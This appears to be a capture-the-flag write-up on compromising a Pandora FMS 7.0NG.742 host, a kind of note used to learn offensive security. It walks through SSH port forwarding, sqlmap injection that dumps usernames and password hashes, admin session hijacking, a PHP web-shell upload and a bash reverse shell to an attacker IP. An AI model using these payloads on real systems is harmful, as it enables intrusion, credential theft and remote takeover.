
# Web services
there is a second web service which is only available locally:
```
$ ls /var/www
html
pandora
$ cat /etc/apache2/sites-enabled/pandora.conf
<VirtualHost localhost:80>
[SNIPPED]
```

try ssh now with port forwarding:
```
ssh daniel@10.10.11.136 -L 8000:127.0.0.1:80
```
Now we can navigate to `http://localhost:8000` on attacker machine to access pandora website which is only served to local host on the victim machine.

Initial page:
```
http://localhost:7777/pandora_console/index.php?login=1
```

version: `v7.0NG.742_FIX_PERL2020`

Login:
![[Pasted image 20231216122828.png]]

## Vulnerability
Search for Pandora version 7.42 mentioned above and 'unauthenticated':
- [Vulnerability](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-32099)
- [Exploit](https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated)
use it to get a shell as `matt`

```
$ find / -perm 4755 2>/dev/null
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/fusermount
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
```

according to [sonar source](https://www.sonarsource.com/blog/pandora-fms-742-critical-code-vulnerabilities-explained/) article the vulnerable php file is `/include/chart_generator.php?session_id=1`
get the request from burpsuite and use sqlmap to get more info about the database

## sqlmap
#sqlmap
```
# get dbs
$ sqlmap -r chart_generator.req --dbs
available databases [2]:
[*] information_schema
[*] pandora

# get db tables
$ $ sqlmap -r chart_generator.req -D pandora --tables --dbms=mysql
Database: pandora
[178 tables]
+------------------------------------+
| taddress                           |
| taddress_agent                     |
| tagent_access                      |
| tagent_custom_data                 |
| tagent_custom_fields               |
| tagent_custom_fields_filter        |
| tagent_module_inventory            |
| tagent_module_log                  |
| tagent_repository                  |
| tagent_secondary_group             |
| tagente                            |
| tagente_datos                      |
| tagente_datos_inc                  |
| tagente_datos_inventory            |
| tagente_datos_log4x                |
| tagente_datos_string               |
| tagente_estado                     |
| tagente_modulo                     |
| talert_actions                     |
| talert_commands                    |
| talert_snmp                        |
| talert_snmp_action                 |
| talert_special_days                |
| talert_template_module_actions     |
| talert_template_modules            |
| talert_templates                   |
| tattachment                        |
| tautoconfig                        |
| tautoconfig_actions                |
| tautoconfig_rules                  |
| tcategory                          |
| tcluster                           |
| tcluster_agent                     |
| tcluster_item                      |
| tcollection                        |
| tconfig                            |
| tconfig_os                         |
| tcontainer                         |
| tcontainer_item                    |
| tcredential_store                  |
| tdashboard                         |
| tdatabase                          |
| tdeployment_hosts                  |
| tevent_alert                       |
| tevent_alert_action                |
| tevent_custom_field                |
| tevent_extended                    |
| tevent_filter                      |
| tevent_response                    |
| tevent_rule                        |
| tevento                            |
| textension_translate_string        |
| tfiles_repo                        |
| tfiles_repo_group                  |
| tgis_data_history                  |
| tgis_data_status                   |
| tgis_map                           |
| tgis_map_connection                |
| tgis_map_has_tgis_map_con          |
| tgis_map_layer                     |
| tgis_map_layer_groups              |
| tgis_map_layer_has_tagente         |
| tgraph                             |
| tgraph_source                      |
| tgraph_source_template             |
| tgraph_template                    |
| tgroup_stat                        |
| tgrupo                             |
| tincidencia                        |
| titem                              |
| tlanguage                          |
| tlayout                            |
| tlayout_data                       |
| tlayout_template                   |
| tlayout_template_data              |
| tlink                              |
| tlocal_component                   |
| tlog_graph_models                  |
| tmap                               |
| tmensajes                          |
| tmetaconsole_agent                 |
| tmetaconsole_agent_secondary_group |
| tmetaconsole_event                 |
| tmetaconsole_event_history         |
| tmetaconsole_setup                 |
| tmigration_module_queue            |
| tmigration_queue                   |
| tmodule                            |
| tmodule_group                      |
| tmodule_inventory                  |
| tmodule_relationship               |
| tmodule_synth                      |
| tnetflow_filter                    |
| tnetflow_report                    |
| tnetflow_report_content            |
| tnetwork_component                 |
| tnetwork_component_group           |
| tnetwork_map                       |
| tnetwork_matrix                    |
| tnetwork_profile                   |
| tnetwork_profile_component         |
| tnetworkmap_ent_rel_nodes          |
| tnetworkmap_enterprise             |
| tnetworkmap_enterprise_nodes       |
| tnews                              |
| tnota                              |
| tnotification_group                |
| tnotification_source               |
| tnotification_source_group         |
| tnotification_source_group_user    |
| tnotification_source_user          |
| tnotification_user                 |
| torigen                            |
| tpassword_history                  |
| tperfil                            |
| tphase                             |
| tplanned_downtime                  |
| tplanned_downtime_agents           |
| tplanned_downtime_modules          |
| tplugin                            |
| tpolicies                          |
| tpolicy_agents                     |
| tpolicy_alerts                     |
| tpolicy_alerts_actions             |
| tpolicy_collections                |
| tpolicy_groups                     |
| tpolicy_modules                    |
| tpolicy_modules_inventory          |
| tpolicy_plugins                    |
| tpolicy_queue                      |
| tprofile_view                      |
| tprovisioning                      |
| tprovisioning_rules                |
| trecon_script                      |
| trecon_task                        |
| trel_item                          |
| tremote_command                    |
| tremote_command_target             |
| treport                            |
| treport_content                    |
| treport_content_item               |
| treport_content_item_temp          |
| treport_content_sla_com_temp       |
| treport_content_sla_combined       |
| treport_content_template           |
| treport_custom_sql                 |
| treport_template                   |
| treset_pass                        |
| treset_pass_history                |
| tserver                            |
| tserver_export                     |
| tserver_export_data                |
| tservice                           |
| tservice_element                   |
| tsesion                            |
| tsesion_extended                   |
| tsessions_php                      |
| tskin                              |
| tsnmp_filter                       |
| ttag                               |
| ttag_module                        |
| ttag_policy_module                 |
| ttipo_modulo                       |
| ttransaction                       |
| ttrap                              |
| ttrap_custom_values                |
| tupdate                            |
| tupdate_journal                    |
| tupdate_package                    |
| tupdate_settings                   |
| tuser_double_auth                  |
| tuser_task                         |
| tuser_task_scheduled               |
| tusuario                           |
| tusuario_perfil                    |
| tvisual_console_elements_cache     |
| twidget                            |
| twidget_dashboard                  |
+------------------------------------+


```

### users
```
$ $ sqlmap -r chart_generator.req -D pandora -T tusuario --dump --dbms=mysql --batch --threads=10

Table: tusuario
[3 entries]
+---------+---------+-----------+--------------------+---------+----------+----------+----------+----------+----------+----------------------------------+----------+----------+-----------+-----------+-----------+------------+------------+------------+------------+------------+--------------+--------------+--------------+---------------+---------------+----------------+---------------------+------------------+-------------------+---------------------+--------------------+---------------------+----------------------+------------------------+------------------------+------------------------+-------------------------+---------------------------+----------------------------+-----------------------------+
| id_skin | id_user | id_filter | email              | phone   | comments | disabled | fullname | is_admin | lastname | password                         | shortcut | timezone | section   | firstname | not_login | language   | block_size | middlename | registered | strict_acl | data_section | last_connect | session_time | login_blocked | shortcut_data | failed_attempt | last_pass_change    | time_autorefresh | force_change_pass | last_failed_login   | metaconsole_access | default_custom_view | default_event_filter | autorefresh_white_list | ehorus_user_level_pass | ehorus_user_level_user | metaconsole_access_node | ehorus_user_level_enabled | metaconsole_agents_manager | metaconsole_assigned_server |
+---------+---------+-----------+--------------------+---------+----------+----------+----------+----------+----------+----------------------------------+----------+----------+-----------+-----------+-----------+------------+------------+------------+------------+------------+--------------+--------------+--------------+---------------+---------------+----------------+---------------------+------------------+-------------------+---------------------+--------------------+---------------------+----------------------+------------------------+------------------------+------------------------+-------------------------+---------------------------+----------------------------+-----------------------------+
| 0       | matt    | NULL      | matt@pandora.htb   | <blank> | <blank>  | 0        | Matt     | 0        | <blank>  | f655f807365b6dc602b31ab3d6d43acc | 0        | <blank>  | Default   | <blank>   | 0         | default    | 20         | -1         | 1623425334 | 0          | <blank>      | 1638796349   | -1           | 0             | NULL          | 0              | 0000-00-00 00:00:00 | 30               | 0                 | 0000-00-00 00:00:00 | basic              | 0                   | 0                    | <blank>                | <blank>                | <blank>                | 0                       | 0                         | 0                          | 0                           |
| 0       | daniel  | NULL      | daniel@pandora.htb | <blank> | <blank>  | 0        | Daniel   | 0        | <blank>  | 76323c174bd49ffbbdedf678f6cc89a6 | 0        | UTC      | Default   | <blank>   | 1         | en_GB      | 20         | -1         | 1623881514 | 0          | <blank>      | 1702568384   | -1           | 0             | NULL          | 0              | 0000-00-00 00:00:00 | 30               | 0                 | 0000-00-00 00:00:00 | basic              | 0                   | 0                    | <blank>                | NULL                   | NULL                   | 0                       | NULL                      | 0                          | 0                           |
| 0       | matt    | NULL      | matt@pandora.htb   | <blank> | <blank>  | 0        | Matt     | 0        | <blank>  | f655f807365b6dc602b31ab3d6d43acc | 0        | <blank>  | Default   | <blank>   | 0         | default    | 20         | -1         | 1623425334 | 0          | <blank>      | 1638796349   | -1           | 0             | NULL          | 0              | 0000-00-00 00:00:00 | 30               | 0                 | 0000-00-00 00:00:00 | basic              | 0                   | 0                    | <blank>                | <blank>                | <blank>                | 0                       | 0                         | 0                          | 0                           |
+---------+---------+-----------+--------------------+---------+----------+----------+----------+----------+----------+----------------------------------+----------+----------+-----------+-----------+-----------+------------+------------+------------+------------+------------+--------------+--------------+--------------+---------------+---------------+----------------+---------------------+------------------+-------------------+---------------------+--------------------+---------------------+----------------------+------------------------+------------------------+------------------------+-------------------------+---------------------------+----------------------------+-----------------------------+

```


### sessions
```
$ sqlmap -r chart_generator.req -D pandora -T tsessions_php --dump --dbms=mysql --batch --threads=10

$ cat ~/.local/share/sqlmap/output/localhost/dump/pandora/tsessions_php.csv | awk -F',' '{print $3,$1,$2}'| sort -nr | head
```

- get the most recent session id for an admin session based on the data in the  `tsessions_php` table which is `v9s1b4qij0kqi3v2ohg5qdbq3q`
- in the browser, replace PHPSESSIONID with this value and refresh the page
- and we're logged in as admin!

## Insecure file upload
Use File Manager to upload a shell code like:
```
<?php 
system($_REQUEST['cmd'])
?>
```
and send a request to that file using the following payload
```
cmd=/bin/bash+-i+>%26+/dev/tcp/<ip>/port+0>%261
```
which is URLencoded of `/bin/bash -i >& /dev/tcp/<ip>/port 0>&1`

get a reverse shell and upgrade shell: #upgrade_shell
```
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Ctrl+z to suspend shell and go back to host machine

stty way -echo; fg    # on host machine
# hit ENTER twice 
# now we have a full pty with all shortcuts workings like tab completion, up arrow for history, etc.

export TERM=screen
# this gets clear screen to work
```
